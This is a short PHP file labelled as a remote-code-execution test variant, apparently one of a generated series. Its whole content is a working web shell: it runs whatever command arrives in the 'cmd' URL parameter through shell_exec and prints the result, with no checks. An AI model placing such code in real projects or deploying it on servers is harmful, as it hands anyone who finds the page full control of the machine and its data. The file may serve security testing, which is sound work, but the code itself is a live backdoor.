<?php
// RCE test variation #1054
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>